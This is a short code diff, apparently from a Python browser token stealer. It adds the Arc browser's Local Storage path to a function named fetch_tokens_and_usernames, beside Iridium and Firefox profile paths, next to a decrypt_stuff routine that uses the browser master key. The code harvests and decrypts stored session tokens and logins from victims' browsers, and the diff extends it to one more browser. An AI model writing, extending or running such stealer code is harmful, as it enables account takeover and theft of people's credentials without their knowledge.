@@ -55,8 +55,9 @@ def fetch_tokens_and_usernames():
           'Iridium': os.path.join(os.getenv("LOCALAPPDATA"), 'Iridium', 'User Data', 'Default', 'Local Storage', 'leveldb'),
           'Firefox': os.path.join(os.getenv("APPDATA"), 'Mozilla', 'Firefox', 'Profiles'),
           'Firefox Nightly': os.path.join(os.getenv("APPDATA"), 'Mozilla', 'Firefox Nightly', 'Profiles'),
+          'Arc': os.path.join(os.getenv("LOCALAPPDATA"), 'Arc', 'User Data', 'Default', 'Local Storage', 'leveldb')  
      }
-
+  
      def decrypt_stuff(buff, master_key) -> str:
           try:
                 iv = buff[3:15]
